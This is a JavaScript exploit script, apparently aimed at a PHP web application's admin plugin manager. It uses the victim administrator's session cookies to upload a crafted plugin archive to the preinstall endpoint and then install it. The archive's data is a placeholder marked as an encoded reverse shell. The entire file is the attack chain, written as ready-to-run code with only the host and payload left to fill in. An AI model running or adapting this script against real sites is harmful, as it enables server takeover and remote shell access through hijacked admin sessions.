var filename = 'norajPlugin.tgz';
var protocol = 'http';
var host = 'example.org';
var root = '';
var data = '\x00 encoded reverse shell here \x00';
var wait = 5;

function uploadPlugin(filename, protocol, host, root, data)
{
  var xhr = new XMLHttpRequest();
  xhr.open("POST", `${protocol}://${host}/${root}index.php/admin/plugins/preinstall`, true);
  xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------34558883619425052733228359545");
  xhr.withCredentials = true;
  var body = "-----------------------------34558883619425052733228359545\r\n" +
    `Content-Disposition: form-data; name="newPlugin"; filename="${filename}"\r\n` +
    "Content-Type: application/gzip\r\n\r\n" +
    data + "\r\n" +
    "-----------------------------34558883619425052733228359545--\r\n";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i);
  //xhr.onreadystatechange = function(){
  //  if(xhr.readyState == 4) {
  //      console.log(xhr);
  //  }
  //};
  xhr.send(new Blob([aBody]));
}

function installPlugin(filename, protocol, host, root)
{
  var xhr = new XMLHttpRequest();
  xhr.open("GET", `${protocol}://${host}/${root}index.php/admin/plugins/add/file/${window.btoa(filename)}`, true);
  xhr.setRequestHeader("Accept", "text/html, */*");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.withCredentials = true;
  var body = "";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i);
  //xhr.onreadystatechange = function(){
  //  if(xhr.readyState == 4) {
  //      console.log(xhr);
  //  }
  //};
  xhr.send(new Blob([aBody]));
}

uploadPlugin(filename, protocol, host, root, data);
setTimeout(installPlugin(filename, protocol, host, root), wait * 1000);
